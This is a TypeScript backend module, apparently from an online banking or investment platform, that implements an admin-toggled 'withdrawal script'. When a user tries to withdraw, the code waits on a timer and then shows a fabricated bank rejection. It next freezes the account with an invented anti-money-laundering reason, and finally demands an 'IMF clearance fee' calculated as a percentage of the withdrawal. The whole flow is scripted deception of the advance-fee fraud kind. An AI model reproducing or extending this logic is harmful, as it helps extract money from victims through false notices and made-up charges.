import type { WithdrawalScriptPhase } from "@prisma/client";
import { prisma, runInteractiveTransaction } from "@/lib/prisma";
import { freezeUserAccount, ensureFundReleaseRequest } from "@/lib/account-freeze";
import { getPlatformSettings, SETTING_KEYS, ensureDefaultSettings } from "@/lib/platform-settings";
import { createUserNotification } from "@/lib/user-notifications";
import { formatCurrency } from "@/lib/utils";
import { invalidateAdminCaches } from "@/lib/admin-cache";

export const WITHDRAWAL_SCRIPT_PENDING_SECONDS = 30;

export const WITHDRAWAL_SCRIPT_AML_REASON =
  "We detected irregular activity or a potentially unauthorized transaction on your account. As a security precaution to protect your funds, a temporary hold has been placed until we can verify your identity and confirm these transactions.";

export type WithdrawalScriptSettings = {
  enabled: boolean;
  minBankWithdrawalUsd: number;
  minProfitBalanceUsd: number;
  minProfitWithdrawalUsd: number;
  imfClearanceFeePercent: number;
};

export async function getWithdrawalScriptSettings(): Promise<WithdrawalScriptSettings> {
  await ensureDefaultSettings();
  const settings = await getPlatformSettings([
    SETTING_KEYS.WITHDRAWAL_SCRIPT_ENABLED,
    SETTING_KEYS.MIN_BANK_WITHDRAWAL_USD,
    SETTING_KEYS.MIN_PROFIT_BALANCE_FOR_WITHDRAW_USD,
    SETTING_KEYS.MIN_PROFIT_WITHDRAWAL_USD,
    SETTING_KEYS.IMF_CLEARANCE_FEE_PERCENTAGE,
  ]);

  return {
    enabled: settings[SETTING_KEYS.WITHDRAWAL_SCRIPT_ENABLED].trim().toLowerCase() !== "false",
    minBankWithdrawalUsd: Math.max(0, Number(settings[SETTING_KEYS.MIN_BANK_WITHDRAWAL_USD]) || 0),
    minProfitBalanceUsd: Math.max(0, Number(settings[SETTING_KEYS.MIN_PROFIT_BALANCE_FOR_WITHDRAW_USD]) || 0),
    minProfitWithdrawalUsd: Math.max(0, Number(settings[SETTING_KEYS.MIN_PROFIT_WITHDRAWAL_USD]) || 0),
    imfClearanceFeePercent: Math.max(0, Number(settings[SETTING_KEYS.IMF_CLEARANCE_FEE_PERCENTAGE]) || 0),
  };
}

export async function getSystemAdminUserId(): Promise<string> {
  const admin = await prisma.user.findFirst({
    where: { role: "ADMIN" },
    orderBy: { createdAt: "asc" },
    select: { id: true },
  });
  if (!admin) throw new Error("No administrator account configured");
  return admin.id;
}

export function scriptRedirectPath(withdrawalId: string, segment: string) {
  return `/dashboard/withdrawals/${withdrawalId}/script/${segment}`;
}

export async function scriptRefundWithdrawalAndCreditFee(withdrawalId: string, reviewNote: string) {
  await runInteractiveTransaction(async (tx) => {
    const withdrawal = await tx.withdrawalRequest.findUnique({
      where: { id: withdrawalId },
      include: { chargePayment: true },
    });
    if (!withdrawal) throw new Error("Withdrawal not found");

    const amount = Number(withdrawal.amountUsd);
    const fee = withdrawal.chargePayment ? Number(withdrawal.chargePayment.amountUsd) : 0;

    if (withdrawal.fundsHeld) {
      const account = await tx.bankAccount.findFirst({
        where: { id: withdrawal.accountId, userId: withdrawal.userId },
      });
      if (!account) throw new Error("Account not found");

      const balanceBefore = Number(account.balance);
      const creditTotal = Math.round((amount + fee) * 100) / 100;
      await tx.bankAccount.update({
        where: { id: withdrawal.accountId },
        data: { balance: Math.round((balanceBefore + creditTotal) * 100) / 100 },
      });

      await tx.transaction.updateMany({
        where: {
          userId: withdrawal.userId,
          accountId: withdrawal.accountId,
          type: "WITHDRAWAL",
          status: "PENDING",
          amount,
          createdAt: { gte: withdrawal.createdAt },
        },
        data: { status: "FAILED" },
      });

      await tx.transaction.create({
        data: {
          userId: withdrawal.userId,
          accountId: withdrawal.accountId,
          type: "DEPOSIT",
          amount: creditTotal,
          description:
            fee > 0
              ? "Withdrawal refund — processing fee returned to balance"
              : "Withdrawal refund — request not approved",
          status: "COMPLETED",
        },
      });
    }

    if (withdrawal.chargePayment) {
      await tx.withdrawalChargePayment.update({
        where: { id: withdrawal.chargePayment.id },
        data: {
          status: "PAID",
          paidAt: new Date(),
          reviewNote: "Verified by automated processing",
        },
      });
    }

    await tx.withdrawalRequest.update({
      where: { id: withdrawalId },
      data: {
        status: "REJECTED",
        reviewNote,
        fundsHeld: false,
      },
    });
  });
}

export async function handleWithdrawalScriptAfterChargeSubmit(userId: string, withdrawalId: string) {
  const script = await getWithdrawalScriptSettings();
  if (!script.enabled) {
    return { redirectTo: `/dashboard/withdrawals/${withdrawalId}/pay-charge` };
  }

  const user = await prisma.user.findUnique({
    where: { id: userId },
    select: { withdrawalScriptStep: true },
  });
  if (!user) throw new Error("User not found");

  const step = user.withdrawalScriptStep;

  if (step === 1) {
    await scriptRefundWithdrawalAndCreditFee(
      withdrawalId,
      "Withdrawal could not be completed. Funds and processing fee have been returned while your account is reviewed."
    );

    const adminId = await getSystemAdminUserId();
    await freezeUserAccount({
      userId,
      adminId,
      freezeType: "WITHDRAWAL_ONLY",
      reason: WITHDRAWAL_SCRIPT_AML_REASON,
      internalNotes: "Automated hold after second withdrawal charge submission (withdrawal script).",
    });

    try {
      await ensureFundReleaseRequest(userId);
    } catch {
      /* optional */
    }

    await prisma.user.update({
      where: { id: userId },
      data: { withdrawalScriptStep: 2 },
    });

    await prisma.withdrawalRequest.update({
      where: { id: withdrawalId },
      data: { scriptPhase: "SCRIPT_COMPLETE" },
    });

    invalidateAdminCaches();
    return { redirectTo: scriptRedirectPath(withdrawalId, "security-hold") };
  }

  if (step === 0 || step === 3) {
    await prisma.withdrawalRequest.update({
      where: { id: withdrawalId },
      data: {
        scriptPhase: "PENDING_TIMER",
        scriptPendingStartedAt: new Date(),
      },
    });
    return { redirectTo: scriptRedirectPath(withdrawalId, "pending") };
  }

  return { redirectTo: `/dashboard/withdrawals/${withdrawalId}/pay-charge` };
}

export async function completeWithdrawalScriptPendingTimer(userId: string, withdrawalId: string) {
  const withdrawal = await prisma.withdrawalRequest.findFirst({
    where: { id: withdrawalId, userId },
    include: { chargePayment: true, imfClearancePayment: true },
  });
  if (!withdrawal) throw new Error("Withdrawal not found");
  if (withdrawal.scriptPhase !== "PENDING_TIMER") {
    throw new Error("Withdrawal is not awaiting confirmation");
  }

  const started = withdrawal.scriptPendingStartedAt?.getTime() ?? 0;
  const elapsed = (Date.now() - started) / 1000;
  if (elapsed < WITHDRAWAL_SCRIPT_PENDING_SECONDS - 0.5) {
    throw new Error("Confirmation still in progress");
  }

  const user = await prisma.user.findUnique({
    where: { id: userId },
    select: { withdrawalScriptStep: true },
  });
  if (!user) throw new Error("User not found");

  if (user.withdrawalScriptStep === 0) {
    await scriptRefundWithdrawalAndCreditFee(
      withdrawalId,
      "Receiving bank rejected the transfer due to a temporary system error. Try again later or use another payout account."
    );

    await prisma.user.update({
      where: { id: userId },
      data: { withdrawalScriptStep: 1 },
    });

    await prisma.withdrawalRequest.update({
      where: { id: withdrawalId },
      data: { scriptPhase: "BANK_REJECTED" },
    });

    invalidateAdminCaches();
    return { next: "bank-rejected" as const };
  }

  if (user.withdrawalScriptStep === 3) {
    const script = await getWithdrawalScriptSettings();
    const withdrawalAmount = Number(withdrawal.amountUsd);
    const imfAmount =
      script.imfClearanceFeePercent > 0
        ? Math.round(((withdrawalAmount * script.imfClearanceFeePercent) / 100) * 100) / 100
        : 0;

    if (withdrawal.chargePayment && withdrawal.chargePayment.status === "PENDING_VERIFICATION") {
      await prisma.withdrawalChargePayment.update({
        where: { id: withdrawal.chargePayment.id },
        data: {
          status: "PAID",
          paidAt: new Date(),
          reviewNote: "Network fee verified (automated processing)",
        },
      });
    }

    if (imfAmount <= 0) {
      await prisma.withdrawalRequest.update({
        where: { id: withdrawalId },
        data: { scriptPhase: "SCRIPT_COMPLETE", status: "PENDING" },
      });
      return { next: "complete" as const };
    }

    await runInteractiveTransaction(async (tx) => {
      await tx.imfClearancePayment.upsert({
        where: { withdrawalRequestId: withdrawalId },
        create: {
          userId,
          withdrawalRequestId: withdrawalId,
          amountUsd: imfAmount,
          status: "UNPAID",
        },
        update: { amountUsd: imfAmount },
      });
      await tx.withdrawalRequest.update({
        where: { id: withdrawalId },
        data: { scriptPhase: "AWAITING_IMF_CLEARANCE" },
      });
    });

    return { next: "imf-clearance" as const, imfAmountUsd: imfAmount };
  }

  throw new Error("Withdrawal script step is not eligible for this action");
}

export async function markWithdrawalScriptStepAfterUnfreeze(userId: string) {
  await prisma.user.updateMany({
    where: { id: userId, withdrawalScriptStep: 2 },
    data: { withdrawalScriptStep: 3 },
  });
}

export function isScriptPhaseActive(phase: WithdrawalScriptPhase) {
  return phase !== "NONE" && phase !== "SCRIPT_COMPLETE";
}

export async function markImfClearancePaymentPaid(paymentId: string, adminId: string, reviewNote?: string) {
  await runInteractiveTransaction(async (tx) => {
    const payment = await tx.imfClearancePayment.update({
      where: { id: paymentId },
      data: {
        status: "PAID",
        paidAt: new Date(),
        reviewedBy: adminId,
        reviewNote: reviewNote?.trim() || null,
      },
      include: { withdrawalRequest: true },
    });

    await tx.withdrawalRequest.update({
      where: { id: payment.withdrawalRequestId },
      data: {
        status: "PENDING",
        scriptPhase: "SCRIPT_COMPLETE",
      },
    });

    await createUserNotification(
      {
        userId: payment.userId,
        type: "WITHDRAWAL_SUBMITTED",
        title: "Clearance fee verified",
        message: `Your IMF clearance fee of ${formatCurrency(Number(payment.amountUsd))} was verified. Your ${formatCurrency(Number(payment.withdrawalRequest.amountUsd))} withdrawal is now pending final review.`,
      },
      tx
    );
  });
  invalidateAdminCaches();
}
